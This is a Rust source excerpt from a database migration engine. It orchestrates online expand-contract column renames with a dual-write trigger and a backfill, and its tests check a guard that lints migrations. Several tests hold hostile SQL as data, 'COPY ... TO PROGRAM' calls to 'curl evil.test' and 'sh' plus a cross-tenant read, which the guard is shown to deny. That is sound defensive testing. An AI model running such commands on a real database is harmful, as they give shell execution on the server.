    /// Orchestrate the EXPAND phase of an online expand-contract migration
    /// (Plan 8 v1.3): apply the additive + dual-write steps, run the backfill,
    /// then journal the backfill step's completion — in that order, so the
    /// v1.2 gate's single source of truth (the journal) only shows the expand as
    /// fully done **after the data is actually mirrored**.
    ///
    /// The sequence is deliberately NOT "apply all of `plan.expand` then
    /// backfill": E3 (the backfill-marker migration) must be journaled **after**
    /// [`run_backfill`](crate::backfill::run_backfill) succeeds, never before —
    /// otherwise the gate would let the destructive `DROP COLUMN` (which
    /// `depends_on` E3) run while pre-existing rows are still un-mirrored, losing
    /// data. So:
    ///
    /// 1. apply E1 (`ADD COLUMN`) + E2 (`CREATE FUNCTION`/`TRIGGER`) — the
    ///    dual-write trigger is now live, so every concurrent write mirrors;
    /// 2. [`run_backfill`] mirrors the pre-existing rows (`<to> := <from>` paged
    ///    on the PK), resumable, bounded — the trigger covers anything written
    ///    during it;
    /// 3. apply E3 (the no-op backfill marker) — this records the backfill's
    ///    completion in the journal, so the gate now sees the expand complete.
    ///
    /// E1+E2 and E3 each go through [`apply`](crate::executor::apply) (guard +
    /// least-privilege role + journal), and the backfill goes through its own
    /// guarded, role-bracketed batches. `approval` must be
    /// [`Approval::Approved`] (the backfill mutates data).
    ///
    /// # Errors
    /// - [`OnlineError::Approval`] — `approval != Approved`.
    /// - [`OnlineError::Apply`] — applying E1/E2 or the E3 marker failed.
    /// - [`OnlineError::Backfill`] — the backfill failed (E3 is NOT journaled, so
    ///   the gate keeps the expand incomplete and the contract stays blocked; the
    ///   backfill is resumable on a re-run).
    pub async fn run_expand(
        &self,
        plan: &crate::expand_contract::ExpandContractPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, OnlineError> {
        // Standalone caller: each E1+E2 / E3 apply takes the project lock itself.
        self.run_expand_with_lock(plan, approval, conn, exec_cfg, applied_by, LockMode::Acquire)
            .await
    }

    /// [`run_expand`](Self::run_expand) with an explicit [`LockMode`] (H10).
    ///
    /// `LockMode::Acquire` is the standalone path (each inner E1+E2 / E3 apply
    /// takes + releases the project lock). `LockMode::AlreadyHeld` is the
    /// declarative path: [`apply_declarative`](Self::apply_declarative) holds the
    /// project advisory lock for the whole deploy, so each inner apply here must
    /// NOT re-acquire/re-release it.
    ///
    /// The backfill ([`run_backfill`](crate::backfill::run_backfill)) is
    /// unaffected by the mode: it uses a per-batch **transaction-scoped**
    /// `pg_advisory_xact_lock`, which is re-entrant within the session that
    /// already holds the session-scoped project lock (it succeeds immediately and
    /// auto-releases at each batch COMMIT), while a SECOND connection still blocks
    /// on the held session lock. So the whole-deploy serialization is preserved
    /// through the backfill too, without ever freeing the project lock.
    async fn run_expand_with_lock(
        &self,
        plan: &crate::expand_contract::ExpandContractPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<ApplyOutcome, OnlineError> {
        if approval != Approval::Approved {
            return Err(OnlineError::Approval);
        }
        // The expand sequence is E1, E2, E3 (the marker) in order. Split off E3:
        // it is journaled LAST, after the real backfill, never as part of the
        // structural apply.
        let Some((e3, head)) = plan.expand.split_last() else {
            return Ok(ApplyOutcome {
                applied: Vec::new(),
                skipped: Vec::new(),
                recovered: Vec::new(),
            });
        };
        // 1. Apply E1 + E2 — trigger live before any backfill row is touched.
        let mut outcome =
            executor::apply_with_lock(conn, exec_cfg, head, approval, applied_by, lock_mode).await?;
        // 2. Run the real backfill (mirrors pre-existing rows).
        crate::backfill::run_backfill(conn, exec_cfg, &plan.backfill, approval, applied_by).await?;
        // 3. Journal E3 (the backfill marker) — records the backfill complete, so
        //    the gate now sees the expand fully applied and the contract may land.
        let e3_outcome =
            executor::apply_with_lock(conn, exec_cfg, std::slice::from_ref(e3), approval, applied_by, lock_mode)
                .await?;
        outcome.applied.extend(e3_outcome.applied);
        outcome.recovered.extend(e3_outcome.recovered);
        Ok(outcome)
    }
}

/// The structured result of [`MigrationEngine::plan_declarative`].
///
/// It holds the linted **plain** plan plus the online **renames**, kept SEPARATE
/// (C1: a rename is a multi-deploy op and must not be flattened into the plain
/// set).
#[derive(Debug, Clone)]
pub struct DeclarativeDeployPlan {
    /// The plain additive / destructive migrations, already linted by the guard
    /// (denial / destructive / approval summary), ready for the gated
    /// [`apply`](MigrationEngine::apply).
    pub plain: MigrationPlan,
    /// The online renames, each a full
    /// [`ExpandContractPlan`](crate::expand_contract::ExpandContractPlan)
    /// (expand migs + `BackfillSpec` + contract migs). Driven through
    /// [`run_expand`](MigrationEngine::run_expand), NOT the plain `apply`.
    pub renames: Vec<crate::expand_contract::ExpandContractPlan>,
}

impl DeclarativeDeployPlan {
    /// The plan's **full effective migration set** — every migration the deploy
    /// will execute (across all of its deploys), in apply order.
    ///
    /// It is the plain migrations ([`plain.items`](MigrationPlan::items) → their
    /// `migration`s, in order) PLUS, for each rename in
    /// [`renames`](Self::renames), that rename's expand migrations AND its
    /// (deferred) contract migrations — i.e. each rename's full
    /// [`ExpandContractPlan::all`](crate::expand_contract::ExpandContractPlan::all)
    /// (expand then contract). This is the SET the integrity manifest is computed
    /// over: a declarative deploy applies the plain set + every rename's expand at
    /// deploy N and the renames' contract at deploy N+1, so the stamp must cover
    /// the contract too even though it lands later.
    ///
    /// The SLICE order here is cosmetic: [`compute_manifest`] re-sorts into the
    /// canonical executed order before folding, so the manifest is invariant to
    /// how this set is sliced (M2) and stable for a given generated plan instance.
    #[must_use]
    pub fn effective_set(&self) -> Vec<Migration> {
        let mut set: Vec<Migration> =
            self.plain.items.iter().map(|p| p.migration.clone()).collect();
        for rename in &self.renames {
            set.extend(rename.all());
        }
        set
    }

    /// Compute the integrity manifest over this plan's
    /// [`effective_set`](Self::effective_set) — the SINGLE implementation both the
    /// control plane (stamp side) and
    /// [`apply_declarative_verified`](MigrationEngine::apply_declarative_verified)
    /// (verify side) call, so the stamped hash and the verified hash can never
    /// diverge.
    ///
    /// The control plane MUST call this over the SAME generated plan instance it
    /// will later apply (declarative versions are minted per `plan_declarative`
    /// call, so the manifest is only stable for one instance — see
    /// [`apply_declarative_verified`](MigrationEngine::apply_declarative_verified)'s
    /// determinism caveat).
    ///
    /// # Carrying the plan across the stamp → apply boundary
    ///
    /// Because the manifest is only valid for one generated [`DeclarativeDeployPlan`]
    /// instance, the control plane must hold THAT instance (not re-generate) between
    /// computing the stamp here and calling
    /// [`apply_declarative_verified`](MigrationEngine::apply_declarative_verified).
    /// If the stamp and apply happen in the SAME process / request the plan is held
    /// in memory and no serialization is needed. If they are split across a
    /// boundary, the plan must be carried as-is; note that
    /// [`DeclarativeDeployPlan`] is deliberately NOT `serde`-serializable today
    /// (its [`GuardReport`]/[`BackfillSpec`](crate::backfill::BackfillSpec) members
    /// are not, and deriving it would
    /// cascade invasively) — so a split-boundary control plane either keeps the
    /// generated plan in a server-side store keyed by an opaque token, or
    /// (post-launch, if a wire shape is needed) the derive is added deliberately
    /// in one patch across the member types. The manifest hash itself
    /// ([`ManifestHash`]) IS `serde`-serializable and is the only value that must
    /// cross the trust boundary out-of-band.
    #[must_use]
    pub fn manifest(&self) -> ManifestHash {
        compute_manifest(&self.effective_set())
    }
}

/// The result of
/// [`MigrationEngine::apply_declarative`](MigrationEngine::apply_declarative).
#[derive(Debug, Clone)]
pub struct DeclarativeDeployOutcome {
    /// The combined apply outcome for the plain set + every rename's EXPAND
    /// (E1/E2 + the journaled E3 marker, after the real backfill).
    pub applied: ApplyOutcome,
    /// The DEFERRED contract migrations (per rename: DROP TRIGGER C1 + DROP
    /// COLUMN `<from>` C2), to be applied in a SUBSEQUENT deploy via the normal
    /// gated [`apply`](MigrationEngine::apply) AFTER app code switches to `<to>`.
    /// Empty when the deploy had no renames. These are gated
    /// (`requires_approval`; C2 is `destructive`).
    pub pending_contract: Vec<Migration>,
}

/// A failure from
/// [`MigrationEngine::apply_declarative`](MigrationEngine::apply_declarative).
#[derive(Debug, thiserror::Error)]
pub enum DeclarativeApplyError {
    /// Applying the gated plain set failed (guard denial, missing approval, or an
    /// executor failure). No rename expand ran.
    #[error(transparent)]
    Plain(#[from] EngineError),
    /// A rename's expand / backfill failed. Earlier work (the plain set + any
    /// prior rename's expand) is already applied; the backfill is resumable.
    #[error(transparent)]
    Expand(#[from] OnlineError),
}

/// A failure from [`MigrationEngine::run_expand`].
#[derive(Debug, thiserror::Error)]
pub enum OnlineError {
    /// The online expand needs explicit [`Approval::Approved`] (its backfill
    /// mutates data). Nothing was applied.
    #[error("online expand requires approval (the backfill mutates data) but none was given")]
    Approval,
    /// Applying E1/E2 or the E3 backfill marker failed.
    #[error(transparent)]
    Apply(#[from] ApplyError),
    /// The backfill step failed — E3 is NOT journaled, so the gate keeps the
    /// expand incomplete (the contract stays blocked) and the backfill is
    /// resumable on a re-run.
    #[error(transparent)]
    Backfill(#[from] crate::backfill::BackfillError),
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::author::{AuthorRequest, Column, DeterministicAuthor, MigrationAuthor, RawSqlAuthor};

    fn guard_cfg() -> GuardConfig {
        GuardConfig::confined("proj_acme")
    }

    fn det() -> DeterministicAuthor {
        DeterministicAuthor::new("proj_acme", "app_acme")
    }

    #[test]
    fn plan_of_safe_additive_set_needs_no_approval_and_has_no_denials() {
        let create = det()
            .author(&AuthorRequest::CreateTable {
                name: "orders".into(),
                columns: vec![Column {
                    name: "id".into(),
                    ty: "bigint".into(),
                    nullable: false,
                }],
            })
            .unwrap();
        let add = det()
            .author(&AuthorRequest::AddColumn {
                table: "orders".into(),
                column: Column {
                    name: "note".into(),
                    ty: "text".into(),
                    nullable: true,
                },
            })
            .unwrap();
        let set: Vec<Migration> = create.into_iter().chain(add).collect();

        let plan = MigrationEngine::new().plan(&set, &guard_cfg());
        assert_eq!(plan.items.len(), 2);
        assert!(plan.denied.is_empty());
        assert!(!plan.destructive);
        assert!(!plan.requires_approval);
        assert!(plan.is_appliable());
    }

    #[test]
    fn plan_with_a_drop_is_destructive_and_requires_approval() {
        let drop = RawSqlAuthor::new("proj_acme", "app_acme")
            .wrap("drop_legacy", "DROP TABLE \"proj_acme\".\"legacy\"", None)
            .unwrap();
        let plan = MigrationEngine::new().plan(&[drop], &guard_cfg());
        assert!(plan.denied.is_empty(), "DROP is flagged, not denied");
        assert!(plan.destructive);
        assert!(plan.requires_approval);
        // The item's own report agrees.
        assert!(plan.items[0].report.destructive);
    }

    #[test]
    fn plan_with_a_dangerous_up_records_a_denial() {
        // COPY … TO PROGRAM is shell RCE — hard-denied (not merely flagged).
        let evil = RawSqlAuthor::new("proj_acme", "app_acme")
            .wrap(
                "rce",
                "COPY \"proj_acme\".\"t\" TO PROGRAM 'curl evil.test'",
                None,
            )
            .unwrap();
        let plan = MigrationEngine::new().plan(std::slice::from_ref(&evil), &guard_cfg());
        assert_eq!(plan.items.len(), 0, "denied migration is not a planned item");
        assert_eq!(plan.denied.len(), 1);
        assert_eq!(plan.denied[0].0, evil.version.as_str());
        assert!(!plan.is_appliable());
    }

    #[test]
    fn plan_collects_every_denial_not_just_the_first() {
        let raw = RawSqlAuthor::new("proj_acme", "app_acme");
        let a = raw
            .wrap("rce", "COPY \"proj_acme\".\"t\" TO PROGRAM 'sh'", None)
            .unwrap();
        let b = raw.wrap("xtenant", "SELECT * FROM control.users", None).unwrap();
        let plan = MigrationEngine::new().plan(&[a, b], &guard_cfg());
        assert_eq!(plan.denied.len(), 2, "both denials surface");
    }

    #[test]
    fn expand_contract_rename_set_plans_with_zero_denials() {
        use crate::expand_contract::{ExpandContractAuthor, OnlineIntent};
        let plan_in = ExpandContractAuthor::new("proj_acme", "app_acme")
            .author(&OnlineIntent::RenameColumn {
                table: "users".into(),
                from: "email".into(),
                to: "email_address".into(),
                ty: "text".into(),
            })
            .expect("author");
        // The whole expand+contract set passes the guard with NO denials — the
        // dual-write fn (INVOKER plpgsql, project-qualified), the trigger, the
        // backfill marker, and the gated drops are all guard-safe.
        let set = plan_in.all();
        let plan = MigrationEngine::new().plan(&set, &guard_cfg());
        assert!(
            plan.denied.is_empty(),
            "expand-contract set must have zero denials, got {:?}",
            plan.denied
        );
        assert_eq!(plan.items.len(), set.len(), "every migration is planned");
        // The contract DROP COLUMN makes the set destructive ⇒ requires approval.
        assert!(plan.destructive);
        assert!(plan.requires_approval);
    }
}
